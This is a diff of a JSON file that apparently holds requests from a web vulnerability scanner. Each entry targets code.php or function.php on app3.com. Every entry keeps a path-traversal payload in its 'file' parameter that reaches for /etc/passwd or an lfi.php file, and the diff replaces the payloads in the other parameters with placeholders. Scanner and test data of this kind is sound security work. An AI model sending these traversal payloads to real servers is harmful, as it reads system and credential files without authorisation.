@@ -3,7 +3,7 @@
     "url": "https://app3.com", 
     "action": "https://app3.com/windows/code.php", 
     "parameter": {
-      "lines": "../../../../../../../../../../../../../../etc/passwd", 
+      "lines": "lines", 
       "file": "../../../../../../../../../../../../../../etc/passwd"
     }, 
     "method": "get"
@@ -12,7 +12,7 @@
     "url": "https://app3.com", 
     "action": "https://app3.com/windows/code.php", 
     "parameter": {
-      "lines": "../../../../../../../../../../../../../lfi.php", 
+      "lines": "lines", 
       "file": "../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
@@ -21,7 +21,7 @@
     "url": "https://app3.com", 
     "action": "https://app3.com/windows/code.php", 
     "parameter": {
-      "lines": "../../../../../../../../../../../../../../lfi.php", 
+      "lines": "lines", 
       "file": "../../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
@@ -30,8 +30,8 @@
     "url": "https://app3.com", 
     "action": "https://app3.com/windows/function.php", 
     "parameter": {
-      "start": "../../../../../../../../../../../../../../etc/passwd", 
-      "end": "../../../../../../../../../../../../../../etc/passwd", 
+      "start": "start", 
+      "end": "end", 
       "file": "../../../../../../../../../../../../../../etc/passwd"
     }, 
     "method": "get"
@@ -40,8 +40,8 @@
     "url": "https://app3.com", 
     "action": "https://app3.com/windows/function.php", 
     "parameter": {
-      "start": "../../../../../../../../../../../../../lfi.php", 
-      "end": "../../../../../../../../../../../../../lfi.php", 
+      "start": "start", 
+      "end": "end", 
       "file": "../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
@@ -50,8 +50,8 @@
     "url": "https://app3.com", 
     "action": "https://app3.com/windows/function.php", 
     "parameter": {
-      "start": "../../../../../../../../../../../../../../lfi.php", 
-      "end": "../../../../../../../../../../../../../../lfi.php", 
+      "start": "start", 
+      "end": "end", 
       "file": "../../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
